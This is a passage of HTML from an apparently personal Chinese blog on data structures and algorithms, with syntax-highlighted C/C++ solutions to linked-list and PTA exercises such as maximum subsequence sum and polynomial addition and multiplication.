class="hljs-string">&quot;查找22是否在该链表中：&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">Find</span>(<span class="hljs-number">22</span>,L))<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;是！\n&quot;</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;否！\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;查找33是否在该链表中：&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">Find</span>(<span class="hljs-number">33</span>,L))<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;是！\n&quot;</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;否！\n&quot;</span>);<br>L = <span class="hljs-built_in">Delete</span>(<span class="hljs-number">1</span>,L);<br>L = <span class="hljs-built_in">Delete</span>(<span class="hljs-number">3</span>,L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;----------删除后-----\n&quot;</span>); <br><span class="hljs-built_in">Print</span>(L);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><br></code></pre></td></tr></table></figure><h2 id="广义表"><a href="#广义表" class="headerlink" title="广义表"></a>广义表</h2><p><img src="/dong.github/images/0906-1.png" alt="alt text"><br><img src="/dong.github/images/0906.png" alt="alt text"></p><h2 id="多重链表"><a href="#多重链表" class="headerlink" title="多重链表"></a>多重链表</h2><p><img src="/dong.github/images/0906-2.png" alt="alt text"><br><img src="/dong.github/images/0906-3.png" alt="alt text"><br><img src="/dong.github/images/0906-4.png" alt="alt text"><br><strong>另一个例子是链式前向星，存树用。当时就要是知道这个就好了，坡度会小很多。</strong></p>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>线性表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构与算法</title>
    <link href="/dong.github/2024/09/05/Algorithms%20&amp;%20Datastructures/"/>
    <url>/dong.github/2024/09/05/Algorithms%20&amp;%20Datastructures/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>绪论。怎么算会呢。书读薄，勤练习喽</strong></p><span id="more"></span><h1 id="参考姥姥："><a href="#参考姥姥：" class="headerlink" title="参考姥姥："></a>参考姥姥：</h1><p><strong><a href="https://github.com/callmePicacho/Data-Structres/blob/master/README.md">https://github.com/callmePicacho/Data-Structres/blob/master/README.md</a></strong><br><strong>终于也到了我去听陈越姥姥的课喽！！！上一次还是翁恺。偶然翻到他们的微博，他们的博客，感受他们的生活。好想去到那样的地方，好想去浙大，认识那些有趣的人。想想真是羡慕，怎样描述呢，那是眼见为实的事，那是无法描述的事，那是至今仍是遥远的理想之城。我一定会抵达。</strong></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-28859c94" role="button" aria-expanded="false" aria-controls="collapse-28859c94">        <div class="fold-arrow">▶</div>序章      </div>      <div class="fold-collapse collapse" id="collapse-28859c94">        <div class="fold-content">          <h2 id="Now-Time-to-take-a-leap-of-FAITH"><a href="#Now-Time-to-take-a-leap-of-FAITH" class="headerlink" title="Now,Time to take a leap of FAITH !"></a>Now,Time to take a leap of FAITH !</h2><p><img src="/dong.github/images/0905-1.png" alt="数据结构层次"><br><img src="/dong.github/images/0905-2.png" alt="逻辑结构&amp;存储结构"><br><img src="/dong.github/images/0905-3.png" alt="数据结构组成"><br><strong>关于分治法的时间复杂度证明：</strong><br><img src="/dong.github/images/0905-6.png" alt="alt text"></p>        </div>      </div>    </div><h1 id="SCU练习平台题解"><a href="#SCU练习平台题解" class="headerlink" title="[SCU练习平台题解]"></a>[SCU练习平台题解]<a href="/dong.github/2024/09/12/Scupractice/" title="课堂练习">课堂练习</a></h1><p><strong>练习</strong><br>PTA 53题 + 上课24例题 + 作业37题：<br>2024&#x2F;09&#x2F;05:<br><strong>NO1，<a href="https://pintia.cn/problem-sets/15/exam/problems/type/7?problemSetProblemId=709&page=0">最大子列和问题</a></strong><br>在线算法，秒辣！</p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8f7bdefe" role="button" aria-expanded="false" aria-controls="collapse-8f7bdefe">        <div class="fold-arrow">▶</div>补：分治法      </div>      <div class="fold-collapse collapse" id="collapse-8f7bdefe">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Max3</span><span class="hljs-params">(<span class="hljs-type">int</span> A,<span class="hljs-type">int</span> B,<span class="hljs-type">int</span> C)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> A &gt; B ? A &gt; C ? A : C : B &gt; C ? B : C;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">DivideAndConquer</span><span class="hljs-params">(<span class="hljs-type">int</span> List[],<span class="hljs-type">int</span> left ,<span class="hljs-type">int</span> right)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> MaxLeftSum,MaxRightSum;<br><span class="hljs-type">int</span> MaxLeftBorderSum,MaxRightBorderSum;<br><br><span class="hljs-type">int</span> LeftBorderSum,RightBorderSum;<br><span class="hljs-type">int</span> center,i;<br><br><span class="hljs-keyword">if</span>(left == right)<br>&#123;<br><span class="hljs-keyword">if</span>(List[left] &gt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> List[left];<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><br>center = (left + right) / <span class="hljs-number">2</span>;<br><br>MaxLeftSum = <span class="hljs-built_in">DivideAndConquer</span>(List,left,center);<br>MaxRightSum = <span class="hljs-built_in">DivideAndConquer</span>(List,center<span class="hljs-number">+1</span>,right);<br><br>MaxLeftBorderSum = <span class="hljs-number">0</span>,LeftBorderSum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(i = center;i &gt;= left;i --)&#123;<br>LeftBorderSum += List[i];<br><span class="hljs-keyword">if</span>(LeftBorderSum &gt; MaxLeftBorderSum)<br>&#123;<br>MaxLeftBorderSum = LeftBorderSum;<br>&#125;<br>&#125;<br><br>MaxRightBorderSum = <span class="hljs-number">0</span>,RightBorderSum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>( i = center + <span class="hljs-number">1</span>;i &lt;= right; ++ i)<br>&#123;<br>RightBorderSum += List[i];<br><span class="hljs-keyword">if</span>(RightBorderSum &gt; MaxRightBorderSum)<br>&#123;<br>MaxRightBorderSum = RightBorderSum;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">Max3</span>( MaxLeftSum,MaxRightSum,MaxLeftBorderSum+MaxRightBorderSum);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">MaxSubseqSum3</span><span class="hljs-params">(<span class="hljs-type">int</span> List[],<span class="hljs-type">int</span> N)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DivideAndConquer</span>(List,<span class="hljs-number">0</span>,N<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div><p><strong>这题非常经典，分治法当然不是最好的。</strong><br><strong>“在线算法”实际上是贪心的方法，另一种办法是动态规划</strong></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-43c07885" role="button" aria-expanded="false" aria-controls="collapse-43c07885">        <div class="fold-arrow">▶</div>动态规划      </div>      <div class="fold-collapse collapse" id="collapse-43c07885">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> dp[<span class="hljs-number">100005</span>];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> t;cin &gt;&gt; t;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">1</span>;k &lt;= t;++ k)<br>&#123;<br><span class="hljs-type">int</span> n;cin &gt;&gt; n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= n;++ i)cin &gt;&gt; dp[i];<br><span class="hljs-type">int</span> start = <span class="hljs-number">1</span>,end = <span class="hljs-number">1</span>,p = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> maxsum = dp[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>;i &lt;= n;++ i)&#123;<br><span class="hljs-keyword">if</span>(dp[i<span class="hljs-number">-1</span>] + dp[i] &gt;= dp[i])<br>dp[i] = dp[i<span class="hljs-number">-1</span>] + dp[i];<br><span class="hljs-keyword">else</span> p = i;<br><span class="hljs-keyword">if</span>(dp[i] &gt; maxsum)<br>&#123;<br>maxsum = dp[i];start = p;end = i;<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,maxsum);<br>&#125;<br><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>但是时间复杂度是O(n*m)肯定会超时，考虑使用单调队列进行优化：</strong></p><pre><code class="hljs">&lt;div class=&quot;fold&quot;&gt;  &lt;div class=&quot;fold-title fold-info collapsed&quot; data-toggle=&quot;collapse&quot; href=&quot;#collapse-0ad24a9b&quot; role=&quot;button&quot; aria-expanded=&quot;false&quot; aria-controls=&quot;collapse-0ad24a9b&quot;&gt;    &lt;div class=&quot;fold-arrow&quot;&gt;▶&lt;/div&gt;动态规划+前缀和+单调队列  &lt;/div&gt;  &lt;div class=&quot;fold-collapse collapse&quot; id=&quot;collapse-0ad24a9b&quot;&gt;    &lt;div class=&quot;fold-content&quot;&gt;      <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br>deque&lt;<span class="hljs-type">int</span>&gt; dq;<br><span class="hljs-type">int</span> s[<span class="hljs-number">100005</span>];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n,m;<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= n;++ i)<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>,&amp;s[i]);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= n;++ i)s[i] = s[i] + s[i<span class="hljs-number">-1</span>];<br><span class="hljs-type">int</span> ans = <span class="hljs-number">-1e8</span>;<br>dq.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= n;++ i)<br>&#123;<br><span class="hljs-keyword">while</span>(!dq.<span class="hljs-built_in">empty</span>()&amp;&amp;dq.<span class="hljs-built_in">front</span>() &lt; i - m)dq.<span class="hljs-built_in">pop_front</span>();<br><span class="hljs-keyword">if</span>(dq.<span class="hljs-built_in">empty</span>())ans = <span class="hljs-built_in">max</span>(ans,s[i]);<br><span class="hljs-keyword">else</span> ans = <span class="hljs-built_in">max</span>(ans,s[i] - s[dq.<span class="hljs-built_in">front</span>()]);<br><span class="hljs-keyword">while</span>(!dq.<span class="hljs-built_in">empty</span>() &amp;&amp; s[dq.<span class="hljs-built_in">back</span>()] &gt;= s[i])dq.<span class="hljs-built_in">pop_back</span>();<br>dq.<span class="hljs-built_in">push_back</span>(i);<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>&lt;p&gt;&lt;strong&gt;由此可见，将数据结构与算法结合，威力无穷&lt;/strong&gt;&lt;/p&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;</code></pre>        </div>      </div>    </div><p><img src="/dong.github/images/0905-5.png" alt="alt text"></p><p><strong>NO2,<a href="https://pintia.cn/problem-sets/15/exam/problems/type/7?problemSetProblemId=710&page=0">多项式的加法和乘法</a></strong></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-94341fa2" role="button" aria-expanded="false" aria-controls="collapse-94341fa2">        <div class="fold-arrow">▶</div>解答      </div>      <div class="fold-collapse collapse" id="collapse-94341fa2">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> maxn 10010</span><br><span class="hljs-type">int</span> a[maxn<span class="hljs-number">+1</span>];<br><span class="hljs-type">int</span> b[maxn<span class="hljs-number">+1</span>];<br><span class="hljs-type">int</span> c[maxn<span class="hljs-number">+1</span>];<br><span class="hljs-type">int</span> d[maxn<span class="hljs-number">+1</span>];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getmul</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> flag = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt;= maxn;++ i)<br>&#123;<br><span class="hljs-keyword">if</span>(a[i] != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j &lt;= maxn;++ j)<br>&#123;<br><span class="hljs-keyword">if</span>(b[j] != <span class="hljs-number">0</span>)<br>&#123;<br>d[i+j] += a[i] * b[j];<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> mark = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt;= maxn;++ i)<br>&#123;<br><span class="hljs-keyword">if</span>(d[i] != <span class="hljs-number">0</span>)<br>&#123;<br>mark = i;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = maxn;i &gt;= <span class="hljs-number">0</span>;i --)<br>&#123;<br><span class="hljs-keyword">if</span>(d[i] != <span class="hljs-number">0</span>)<br>&#123;<br>flag = <span class="hljs-number">1</span>;<br>cout &lt;&lt; d[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; \n&quot;</span>[i==mark];<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(flag == <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;0 0&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getsum</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> flag = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt;= maxn;++ i)<br>&#123;<br>c[i] = a[i] + b[i];<br>&#125;<br><span class="hljs-type">int</span> mark = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt;= maxn;++ i)<br>&#123;<br><span class="hljs-keyword">if</span>(c[i] != <span class="hljs-number">0</span>)<br>&#123;<br>mark = i;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = maxn;i &gt;= <span class="hljs-number">0</span>;i --)<br>&#123;<br><span class="hljs-keyword">if</span>(c[i] != <span class="hljs-number">0</span>)<br>&#123;<br>flag = <span class="hljs-number">1</span>;<br>cout &lt;&lt; c[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; \n&quot;</span>[i == mark];<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(flag == <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;0 0&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> num1,num2;<br>cin &gt;&gt; num1;<br><span class="hljs-keyword">while</span>(num1--)<br>&#123;<br><span class="hljs-type">int</span> x,y;<br>cin &gt;&gt; x &gt;&gt; y;<br>a[y] = x;<br>&#125;<br>cin &gt;&gt; num2;<br><span class="hljs-keyword">while</span>(num2--)<br>&#123;<br><span class="hljs-type">int</span> x,y;<br>cin &gt;&gt; x &gt;&gt; y;<br>b[y] = x;<br>&#125;<br><span class="hljs-built_in">getmul</span>();<br><span class="hljs-built_in">getsum</span>();<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>4 数组×40044 字节&#x2F;数组&#x3D;160176 字节</strong><br><strong>这大约是 156.5 KB。</strong><br><strong>这样虽然过了，但是没考虑过空间浪费。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> maxn 10010</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span> *List;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">data</span>&#123;<br><span class="hljs-type">int</span> x;<br><span class="hljs-type">int</span> y;<br>&#125;;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">data</span> Data[maxn];<br><span class="hljs-type">int</span> Last;<br>&#125;;<br><span class="hljs-function">List <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>List L = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> LNode));<br>L-&gt;Last = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">return</span> L;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y,List L)</span></span><br><span class="hljs-function"></span>&#123;<br>L-&gt;Last++;<br>L-&gt;Data[L-&gt;Last].x = x;<br>L-&gt;Data[L-&gt;Last].y = y;<br><span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-comment">//int Length(List L)&#123;</span><br><span class="hljs-comment">//return L-&gt;Last+1;</span><br><span class="hljs-comment">//&#125; </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getsum</span><span class="hljs-params">(List L1,List L2)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> pointer1 = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> pointer2 = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(pointer1 &lt;= L1-&gt;Last &amp;&amp; pointer2 &lt;= L2-&gt;Last)<br>&#123;<br><span class="hljs-keyword">if</span>(L1-&gt;Data[pointer1].y &gt; L2-&gt;Data[pointer2].y)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d &quot;</span>,L1-&gt;Data[pointer1].x,L1-&gt;Data[pointer1].y);<br>pointer1++;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(L1-&gt;Data[pointer1].y &lt; L2-&gt;Data[pointer2].y)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d &quot;</span>,L2-&gt;Data[pointer2].x,L2-&gt;Data[pointer2].y);<br>pointer2++;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d &quot;</span>,L1-&gt;Data[pointer1].x + L2-&gt;Data[pointer2].x,L1-&gt;Data[pointer1].y);<br>pointer1++;<br>pointer2++;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(pointer1 &lt;= L1-&gt;Last)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d &quot;</span>,L1-&gt;Data[pointer1].x,L1-&gt;Data[pointer1].y);<br>pointer1++ ;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pointer2 &lt;= L2-&gt;Last)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d &quot;</span>,L2-&gt;Data[pointer2].x,L2-&gt;Data[pointer2].y);<br>    pointer2++ ;<br>&#125;<br>&#125;<br><span class="hljs-comment">//void getmul(List L1,List L2)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//int pointer1 = 0;</span><br><span class="hljs-comment">//int pointer2 = 0;</span><br><span class="hljs-comment">//for(;pointer1 &lt;= L1-&gt;Last;pointer1++ )</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//for(;pointer2 &lt;= L2-&gt;Last;pointer2++ )</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-function"><span 